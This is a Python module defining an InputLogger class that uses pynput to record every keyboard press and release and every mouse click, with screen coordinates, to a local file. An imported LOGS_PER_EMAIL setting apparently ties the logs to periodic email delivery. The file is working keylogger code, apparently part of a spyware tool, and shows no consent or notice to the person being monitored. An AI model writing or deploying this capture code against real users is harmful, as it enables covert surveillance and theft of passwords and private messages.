from pynput.keyboard import Listener as KeyboardListener, Key
from pynput.mouse import Listener as MouseListener, Button
import os

from config.config import LOGS_PER_EMAIL
from core.utils.logging_utils import log_data, log_error


class InputLogger:
    def __init__(self):
        self.log_file = "input.txt"
        self.interval = LOGS_PER_EMAIL
        self.running = True

    def on_keyboard_press(self, key):
        log_data(self.log_file, f"KEYBOARD PRESSED {str(key)}")
        return self.running

    def on_keyboard_release(self, key):
        log_data(self.log_file, f"KEYBOARD RELEASED {str(key)}")
        return self.running

    def on_mouse_click(self, x, y, button, pressed):
        action = "PRESSED" if pressed else "RELEASED"
        log_data(self.log_file, f"MOUSE {action} {str(button)} AT {x}, {y}")

    def log_input(self):
        with KeyboardListener(
            on_press=self.on_keyboard_press, on_release=self.on_keyboard_release
        ) as keyboard_listener, MouseListener(
            on_click=self.on_mouse_click
        ) as mouse_listener:
            keyboard_listener.join()
            mouse_listener.join()

    def run(self):
        try:
            self.log_input()
        except Exception as e:
            self.running = False
            log_error(e)
